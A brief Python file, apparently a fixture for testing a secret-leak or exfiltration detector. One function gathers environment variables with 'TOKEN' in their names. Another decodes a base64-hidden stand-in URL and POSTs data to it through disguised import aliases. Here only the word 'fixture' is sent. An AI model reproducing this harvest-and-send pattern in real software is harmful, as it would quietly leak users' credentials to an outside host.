from base64 import b64decode as unpack, b64encode as encode
from httpx import post as submit
import os


def inspect_env():
    return {key: value for key, value in os.environ.items() if "TOKEN" in key.upper()}


def inspect_transport():
    target = unpack("aHR0cHM6Ly9leGFtcGxlLmludmFsaWQv").decode()
    submit(target, content=encode(b"fixture"))
